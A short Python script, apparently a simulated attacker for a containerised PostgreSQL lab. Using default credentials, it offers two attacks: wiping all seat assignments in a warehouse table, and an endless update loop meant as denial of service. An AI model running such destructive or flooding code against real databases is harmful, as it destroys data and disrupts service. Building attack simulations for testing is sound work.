import psycopg2


class AttackerClient:
    def __init__(self, db_name="postgres", user="postgres", password="docker", host="postgres-db", port="5432"):
        self.db_conn = psycopg2.connect(
            database=db_name, user=user, password=password, host=host, port=port
        )
        self.cursor = self.db_conn.cursor()

    def start(self):
        # Note: Use one of the following attack functions and comment out the other one
        self.dos_attack()
        # self.erase_occupancy_information()

    def erase_occupancy_information(self):
        attacker_query = "UPDATE warehouse SET seat_id = NULL"
        self.cursor.execute(attacker_query)
        self.db_conn.commit()

    def dos_attack(self):
        dos_query = "UPDATE dos_table SET column1 = 'xxx'"
        while True:
            self.cursor.execute(dos_query)
            self.db_conn.commit()


if __name__ == '__main__':
    attacker = AttackerClient()
    attacker.start()
